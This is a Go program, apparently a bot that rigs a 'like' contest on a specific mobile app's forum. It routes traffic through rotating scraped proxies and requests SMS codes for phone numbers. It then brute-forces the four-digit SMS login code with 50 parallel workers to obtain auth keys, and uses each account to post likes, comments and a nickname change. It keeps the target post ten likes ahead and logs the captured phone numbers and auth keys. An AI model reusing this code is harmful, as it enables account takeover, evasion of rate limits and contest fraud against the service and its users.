package main

import (
	"encoding/json"
	"fmt"
	"log"
	"strconv"
	"sync"
	"time"

	"github.com/go-redis/redis"
	"github.com/ipiao/remote"
)

var (
	pt        = remote.XiciProxyTypeNT
	timeout   = time.Second * 5
	nsjHost   = "https://nsj-m.yy0578.com"
	redisHost = "118.25.7.38:6379"
	redisPwd  = ""
	did       = 654
	posterId  = 10000007
	ipPage    = 1

	redisClient     = redis.NewClient(&redis.Options{Addr: redisHost, Password: redisPwd})
	ipStore         = remote.MountRedisIPStore(redisClient, "pre_pool")
	accessableStore = remote.MountRedisIPStore(redisClient, "accessable_pool")

	proxyRemoteStore, _           = remote.NewProxyRemoteStoreTimeout(nsjHost, 0, ipStore, timeout)
	accessableProxyRemoteStore, _ = remote.NewProxyRemoteStoreTimeout(nsjHost, 0, accessableStore, timeout)
)

func makeNsjOpts(r *remote.ProxyRemote, store *remote.RedisIPStore) []remote.Option {
	return []remote.Option{store.NotBad, func(*remote.ProxyInfo) bool {
		ret := make(map[string]interface{})

		err := r.Post("/v2/imagescode/gettokennum", createRequest(map[string]interface{}{}), &ret)
		if err != nil {
			log.Println(err)
		}
		log.Println(ret)
		return err == nil
	}}
}

func initIPStore(pages []int) {
	err := remote.InitXiCiIppool(pages, pt, ipStore, "")
	if err != nil {
		log.Println("Error-InitXiCiIppool:", err)
		time.Sleep(time.Second * 10)
		initIPStore(pages)
	}
}

func initAccessablePool(size int, page int) {

	nowsize := accessableStore.Size()
	if nowsize < size {
		i := 0
		for i < size-nowsize {
			info, err := ipStore.Get()
			if err != nil {
				log.Println("Error-ipStore.Get:", err)
				if ipStore.Size() == 0 {
					page++
					initIPStore([]int{page})
					initAccessablePool(size, page)
				}
				continue
			}

			r, err := proxyRemoteStore.New()
			if err != nil {
				log.Println("Error-proxyRemoteStore.New:", err)
				continue
			}
			opts := makeNsjOpts(r, accessableStore)
			err = accessableStore.Save(info, opts...)
			if err == nil {
				i++
			}
			ipStore.DelBad(info)
		}
	}

	log.Println("initAccessablePool success:", size)

	go func() {
		select {
		case <-time.After(time.Minute * 10):
			if ipStore.Size() > size*2 {
				go func() {
					defer recover()
					initIPStore([]int{page/50 + 1})
				}()
				page++
			}
			initAccessablePool(size, page)
		}
	}()

}

func createRequest(r map[string]interface{}) map[string]interface{} {
	r["deviceId"] = "A0644CSC-5FFB-431B-DFD1-323C2F34537D"
	r["appVersion"] = "1.0.2"
	r["deviceName"] = "iPhone10.2(iOS11.4.1)"
	r["deviceType"] = "2"
	return r
}

type DetailResult struct {
	Success   bool `json:"success"`
	DetailsPO struct {
		PostsList []struct {
			Id       int `json:"id"`
			Praises  int `json:"praises"`
			Comments int `json:"comments"`
		} `json:"postsList"`
	} `json:"detailsPO"`
}

type Detail struct {
	Success bool `json:"success"`
	Detail  struct {
		Id       int `json:"id"`
		Praises  int `json:"praises"`
		Comments int `json:"comments"`
	} `json:"detail"`
}

func getMaxPraize() (max, second, self int, err error) {
	r, err := accessableProxyRemoteStore.Get()
	if err != nil {
		log.Println("Error-accessableProxyRemoteStore:", err)
		// return
		if r == nil {
			log.Println("error in rs.store.Get()")
			return
		} else {
			log.Println("error in NewProxyRemoteTimeout")
		}
	}
	req := map[string]interface{}{
		"labelPO": map[string]interface{}{
			"id":        80,
			"labelName": "#鸟斯基#",
		},
		"labelActsCount": 1,
		"currentPage":    1,
		"limit":          10,
		"isPaging":       true,
	}
	ret := new(DetailResult)
	err = r.Post("/v1/bbs/queryPostsRecommendDetails", createRequest(req), ret)
	if err != nil {
		log.Println("queryPostsRecommendDetails:", err)
		// accessableStore.DelBad(r.ProxyInfo())
		return
	}

	hasSelf := false
	prises := []int{}
	for _, p := range ret.DetailsPO.PostsList {
		prises = append(prises, p.Praises)
		if p.Praises >= max {
			second = max
			max = p.Praises
		} else {
			if p.Praises > second {
				second = p.Praises
			}
		}
		if p.Id == did {
			self = p.Praises
			hasSelf = true
		}
	}

	if !hasSelf {
		nret := new(Detail)
		err = r.Post("/v1/bbs/queryDetails", createRequest(map[string]interface{}{"detailId": strconv.Itoa(did)}), &nret)
		self = nret.Detail.Praises
	}
	log.Println(prises)
	log.Println("RETURN-getMaxPraize:", max, second, self, err)
	return
}

func doit(num int) {

	for i := 0; i < num; i++ {
		log.Println("开始第", i+1)

		var err error
		r, _ := accessableProxyRemoteStore.Get()

		// 获取token
		req := map[string]interface{}{}
		ret := make(map[string]interface{})
		// err = r.Post("/v2/imagescode/gettokennum", req, &ret)
		// if err != nil {
		// 	panic(err)
		// }
		// log.Println("gettokennum:", ret)
		// token := ret["Token"].(string)
		token := "KOn189bBNmbo-DALJ9dGE53MK3FANl5A9_hFB7dcS4EtWrvmtLH8G34fow3tjTfRvH_F4lOJBD-qgr4Jyn0akxe61AJiDHpegfmJssy_jVk="

		// 发送短信
		phone := getPhone()
		req = map[string]interface{}{
			"code":        "3155",
			"smsCodeType": 1,
			"mobilePhone": phone,
			"token":       token,
		}
		err = r.Post("/v1/smsController/sendVerifyCode", createRequest(req), &ret)
		if err != nil {
			log.Println(err)
			return
		}
		log.Println("sendVerifyCode", ret)
		time.Sleep(time.Second * 2)
		// 刷登录接口
		var authKey string
		var uid int

		gonums := 50
		done := make(chan int, gonums-1)
		wg := sync.WaitGroup{}
		for i := 0; i < gonums; i++ {
			wg.Add(1)
			go func(c int) {
				nr := remote.NewProxyRemote(nsjHost, r.ProxyInfo())
			OUT:
				for j := 0; j < 10000/gonums; j++ {
					select {
					case <-done:
						wg.Done()
						break OUT
					case <-time.After(time.Millisecond * 5):
						smsCode := fmt.Sprintf("%04d", c*10000/gonums+j)
						nreq := map[string]interface{}{
							"loginAccount":        phone,
							"smsVerificationCode": smsCode,
						}
						nret := map[string]interface{}{}
						err = nr.Post("/v1/userAccount/login", createRequest(nreq), &nret)
						if err != nil {
							log.Println("login err:", err)
							continue
						}
						if ak, ok := nret["authkey"]; ok {
							authKey = ak.(string)
							for k := 0; k < gonums-1; k++ {
								done <- k
							}
							log.Println("login success:", nret)
							log.Println("login smsCode:", smsCode)

							if acc, ok1 := nret["userAccount"]; ok1 {
								if accM, ok2 := acc.(map[string]interface{}); ok2 {
									if uidStr, ok3 := accM["id"]; ok3 {
										id, _ := uidStr.(json.Number).Int64()
										uid = int(id)
									}
								}
							}
							wg.Done()
							break OUT
						}
					}
				}
			}(i)
		}
		wg.Wait()
		log.Println("---------------------------------------------------------------------------")

		// 点赞
		req = map[string]interface{}{
			"praisesRelation": map[string]interface{}{
				"detailsId":   654,
				"praisesType": 1,
			},
		}
		request1, err := r.CovertRequest("POST", "/v1/bbs/addPraise", createRequest(req))
		if err != nil {
			log.Println("addPraise CovertRequest error:", err)
		}
		request1.Header.Set("authkey", authKey)
		bs, err := r.CallRequest(request1)
		if err != nil {
			log.Println("CallRequest:", err)
		}
		err = remote.DeJSON(bs, &ret)
		if err != nil {
			log.Println(err)
		}
		log.Println("addPraise return:", ret)

		// 评论
		comment := getComment()
		req = map[string]interface{}{
			"comment": map[string]interface{}{
				"detailsId":   did,
				"commentText": comment,
			},
			"posterId": posterId,
		}
		request2, err := r.CovertRequest("POST", "/v1/bbs/addComment", createRequest(req))
		if err != nil {
			log.Println(err)
		}
		request2.Header.Set("authkey", authKey)
		bs, err = r.CallRequest(request2)
		if err != nil {
			log.Println(ret)
		}
		err = remote.DeJSON(bs, &ret)
		if err != nil {
			log.Println(err)
		}
		log.Println("addComment return:", ret)

		// 改名
		nickName := getNickName()
		if nickName != "" {
			req = map[string]interface{}{
				"uid":      uid,
				"sex":      strconv.Itoa(i / 2),
				"nickName": nickName,
			}
			request3, err := r.CovertRequest("POST", "/v1/userAccount/updateUserInfoById", createRequest(req))
			if err != nil {
				log.Println(err)
			}
			request3.Header.Set("authkey", authKey)
			bs, err = r.CallRequest(request3)
			if err != nil {
				log.Println(ret)
			}
			err = remote.DeJSON(bs, &ret)
			if err != nil {
				log.Println(err)
			}
			log.Println("updateUserInfoById return:", ret)
		}

		ssyt := fmt.Sprintf("phone:%s, authKey:%s, uid:%d, nickName:%s, comment:%s", phone, authKey, uid, nickName, comment)
		storeResource("success_tries", ssyt)

		log.Println(ssyt)
		time.Sleep(time.Second * 10)
	}
}

func main() {
	var err error
	var targetDistance = 10 // 要保证10个点赞的差距

	accessableStore.Clear()
	accessableStore.Save(&remote.ProxyInfo{
		IP:       "218.60.8.99",
		Port:     "3129",
		Protocol: "https",
	})

	ipStore.Clear()
	// log.Println(err)
	// err = ipStore.ClearBad()
	// log.Println(err)
	// accessableStore.Clear()
	// log.Println(err)
	// accessableStore.ClearBad()
	// log.Println(err)
	// initIPStore([]int{ipPage})
	go initAccessablePool(5, ipPage)

	var max, second, self int

GetMaxPraize:
	log.Println("Start GetMaxPraize")
	max, second, self, err = getMaxPraize()
	if err != nil {
		time.Sleep(time.Second * 10)
		log.Println("10 seconds later getMaxPraize")
		goto GetMaxPraize
	}

	if self == max {
		dist := self - second
		log.Print("当前已经是第一了，比第二名多:", dist)
		if dist >= targetDistance {
			log.Print("5分钟后我再来看")
			time.Sleep(time.Minute * 5)
			log.Print("5分钟过去了")
			goto GetMaxPraize
		} else {
			doit(targetDistance - dist)
			goto GetMaxPraize
		}
	} else {
		log.Print("当前已经不是第一了，比第一名少:", max-self)

		doit(max - self + targetDistance)
		goto GetMaxPraize
	}
}
